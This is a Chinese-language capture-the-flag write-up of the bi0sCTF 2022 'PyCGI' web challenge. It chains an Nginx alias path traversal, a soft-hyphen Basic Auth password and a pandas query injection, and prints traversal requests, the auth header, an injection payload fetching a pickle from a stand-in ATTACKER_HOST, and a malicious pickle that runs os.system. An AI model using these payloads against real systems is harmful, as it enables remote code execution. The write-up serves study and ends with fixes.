# bi0sCTF 2022 PyCGI Writeup

## 题目简述

PyCGI 是一条由 Nginx alias 路径穿越、Basic Auth 隐形 Unicode 密码和 pandas 表达式注入串成的 Web 利用链。先读取容器入口脚本与 CGI 源码，恢复管理员密码和危险的 `DataFrame.query` 调用；再注入 `@pd.read_pickle(URL)`，让服务端下载并反序列化恶意 pickle，最终读取随机化文件名的 flag。

题目中的远程地址已经失效，本文使用占位主机描述请求；所有关键配置、认证值和 payload 均可由仓库源码独立恢复。

## 解题过程

### 利用 alias 路径穿越读取源码

Nginx 配置为：

```nginx
location /static {
    alias /static/;
}
```

`location` 没有结尾斜杠，而 `alias` 有。请求 `/static../...` 时，拼接和规范化后的路径可越出 `/static`。例如：

```text
GET /static../docker-entrypoint.sh HTTP/1.1
Host: TARGET
```

以及：

```text
GET /static../panda/cgi-bin/search_currency.py HTTP/1.1
Host: TARGET
```

入口脚本透露了两件事：flag 被重命名为 40 位 SHA-1 十六进制文件名；`/cgi-bin/` 的 Basic Auth 用户为 `admin`，密码是肉眼几乎不可见的软连字符 U+00AD。

因此，`用户名:密码` 的原始字节为 `admin:` 加 UTF-8 的 `C2 AD`，对应认证头：

```http
Authorization: Basic YWRtaW46wq0=
```

### 定位 pandas query 注入

`search_currency.py` 把请求参数直接插入表达式：

```python
currency_code = params["currency_name"]
results = df.query(f"currency == '{currency_code}'")
```

pandas query 语法中的 `@name` 可以引用 Python 调用环境里的对象。模块已经以 `pd` 名称导入 pandas，所以可以强制求值：

```text
x'|@pd.read_pickle('http://ATTACKER_HOST/output.exploit')|'
```

包装后形成的表达式包含 `@pd.read_pickle(...)`。`read_pickle` 支持 HTTP URL，并会对下载内容执行 Python pickle 反序列化。这里的危险点不是 DataFrame 数据，而是把不可信表达式和不可信 pickle URL 同时交给了求值器。

自制 `Server.get_params()` 只按 `?`、`&`、`=` 切分 `REQUEST_URI`，没有执行标准 URL 解码。若普通客户端自动把引号、竖线或 `@` 编码，服务端可能收到字面 `%xx`。官方求解器因此使用原始 TCP 请求发送 payload；复现时也应核对实际请求行。

### 构造 pickle 读取随机文件名

容器用 `shasum` 把 `/flag.txt` 重命名为根目录下恰好 40 个字符的文件。Shell 的 `?` 每个匹配任意单字符，所以无需知道随机名称：

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        command = "cat /" + "?" * 40
        return os.system, (command,)

with open("output.exploit", "wb") as f:
    pickle.dump(Payload(), f)
```

在可被题目容器访问的 HTTP 服务上托管 `output.exploit`，然后发送原始请求。请求行中的 payload 应替换为实际托管 URL：

```http
GET /cgi-bin/search_currency.py?currency_name=x'|@pd.read_pickle('http://ATTACKER_HOST/output.exploit')|' HTTP/1.1
Host: TARGET
Authorization: Basic YWRtaW46wq0=
Connection: close

```

pickle 的 `__reduce__` 在反序列化时调用 `os.system`，命令输出继承 CGI 标准输出并进入 HTTP 响应。由此读到：

```text
bi0sCTF{9a18559a42e7302b15eeb45c09ab39d6}
```

pickle 天生允许构造任意对象恢复逻辑，不能对未知文件执行本地 `pickle.load`；本题 payload 只应在授权的 CTF 实例中使用。

官方赛后文章按 alias 穿越、软连字符认证和 pandas pickle RCE 的顺序给出了完整利用链：[PyCGI 官方题解](https://blog.bi0s.in/2023/01/23/Web/bi0sCTF22-PyCGI/)。

## 方法总结

这道题的每一环都为下一环提供信息：alias 配置错误泄露入口脚本与 CGI；入口脚本给出 Basic Auth 密码和随机文件名规则；CGI 源码暴露 `df.query` 注入；pandas 的 `@` 外部变量和 `read_pickle` 最终把表达式注入升级为命令执行。

修复应同时覆盖各层：让 `location` 与 `alias` 的斜杠语义一致并禁止越界；不要使用不可见字符作为唯一秘密；对查询条件使用固定列比较而非字符串拼接；绝不从用户可控 URL 反序列化 pickle。
